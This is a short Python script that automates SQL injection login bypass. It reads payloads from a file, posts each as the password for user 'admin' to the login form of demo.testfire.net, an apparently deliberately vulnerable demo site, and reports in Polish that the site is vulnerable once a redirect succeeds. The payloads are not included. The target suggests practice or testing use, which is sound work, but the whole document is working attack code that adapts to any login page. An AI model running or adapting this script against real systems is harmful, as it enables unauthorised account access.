import requests

# The API endpoint
url = "https://demo.testfire.net/doLogin"
session = requests.Session()
with open ("payloads.txt", "r") as f:
    payload = f.readlines()

# Data to be sent
for line in payload:
    line=line.strip()
    data = {
        "uid": "admin",
        "passw": f"{line}",
    }
    response = session.post(url, data=data)
    if response.url != "https://demo.testfire.net/login.jsp":
        print ("Strona jest podatna na SQL Injection")
        print (f"Payload: {line}")
        break


